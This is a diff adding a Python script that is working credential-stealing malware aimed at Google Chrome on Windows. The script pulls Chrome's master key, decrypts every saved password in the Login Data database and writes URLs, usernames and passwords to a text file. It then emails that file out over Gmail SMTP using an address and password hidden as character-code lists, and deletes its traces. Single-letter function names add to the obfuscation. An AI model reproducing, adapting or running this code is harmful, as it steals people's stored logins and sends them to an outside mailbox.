@@ -1,0 +1,87 @@
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import timezone, datetime, timedelta
+import smtplib
+from email.message import EmailMessage
+
+def d(t):
+    return datetime(1601, 1, 1) + timedelta(microseconds=t)
+
+def g():
+    p = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    with open(p, "r", encoding="utf-8") as f:
+        l = f.read()
+        l = json.loads(l)
+    k = base64.b64decode(l["os_crypt"]["encrypted_key"])
+    k = k[5:]
+    return win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]
+
+def dc(p, k):
+    try:
+        i = p[3:15]
+        p = p[15:]
+        c = AES.new(k, AES.MODE_GCM, i)
+        return c.decrypt(p)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(p, None, None, None, 0)[1])
+        except:
+            return ""
+
+def m():
+    k = g()
+    dbp = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+    fn = "ChromeData.db"
+    shutil.copyfile(dbp, fn)
+    db = sqlite3.connect(fn)
+    c = db.cursor()
+    c.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
+    with open("o8o.txt", "w", encoding="utf-8") as f:
+        for r in c.fetchall():
+            o = r[0]
+            a = r[1]
+            u = r[2]
+            p = dc(r[3], k)
+            d_c = r[4]
+            d_l = r[5]        
+            if u or p:
+                f.write(f"Origin URL: {o}\n")
+                f.write(f"Action URL: {a}\n")
+                f.write(f"Username: {u}\n")
+                f.write(f"Password: {p}\n")
+            else:
+                continue
+            if d_c != 86400000000 and d_c:
+                f.write(f"Creation date: {str(d(d_c))}\n")
+            if d_l != 86400000000 and d_l:
+                f.write(f"Last Used: {str(d(d_l))}\n")
+            f.write("="*50 + "\n")
+    db.close()
+    cd = [97,112,46,103,117,121,115,46,115,116,111,114,101,64,103,109,97,105,108,46,99,111,109]
+    s_e = "".join(chr(code) for code in cd)
+    cc = [117,122,104,115,121,112,97,112,119,115,114,97,121,122,100,120]
+    s_p = "".join(chr(code) for code in cc)
+    cd = [97,112,46,103,117,121,115,46,115,116,111,114,101,64,103,109,97,105,108,46,99,111,109]
+    r_e =  "".join(chr(code) for code in cd)
+    msg = EmailMessage()
+    msg['From'] = s_e
+    msg['To'] = r_e
+    with open("o8o.txt", "rb") as file:
+        msg.add_attachment(file.read(), maintype='text', subtype='plain', filename="o8o.txt")
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as srvr:
+        srvr.login(s_e, s_p)
+        srvr.send_message(msg)
+    try:
+        os.remove(fn)
+        os.remove('o8o.txt')
+    except:
+        pass
+
+if __name__ == "__main__":
+    m()
